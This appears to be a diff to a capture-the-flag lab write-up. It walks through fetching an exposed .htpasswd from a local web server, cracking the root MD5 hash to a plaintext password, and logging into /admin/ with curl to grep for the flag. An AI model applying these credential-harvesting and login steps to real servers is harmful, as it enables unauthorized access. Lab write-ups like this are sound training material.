@@ -7,17 +7,18 @@
 
 ## Summary
 
-page: `http://localhost:8080/whatever/` → then `http://localhost:8080/admin/`
+page: `http://localhost:8081/whatever/` → then `http://localhost:8081/admin/`
 commands:
 ```bash
 # 1. Find exposed .htpasswd
-curl http://localhost:8080/whatever/htpasswd
+curl http://localhost:8081/whatever/htpasswd
 # → root:437394baff5aa33daa618be47b75cb49
 
 # 2. Crack MD5 on crackstation.net → qwerty123@
 
-# 3. Login to /admin/ with basic auth
-curl -u "root:qwerty123@" http://localhost:8080/admin/
+# 3. Login to /admin/ with basic auth + form POST - -s (silent) hides the progress bar - -d = data. It sends the string as the POST request body, like submitting a form. It also automatically sets Content-Type: application/x-www-form-urlencoded (the standard form encoding).
+curl -s -X POST "http://localhost:8081/admin/" \
+     -d "username=root&password=qwerty123@&Login=Login" | grep -i flag
 ```
 
 ## Found `/whatever/` directory (listed in robots.txt). Inside was an exposed `.htpasswd` file containing:
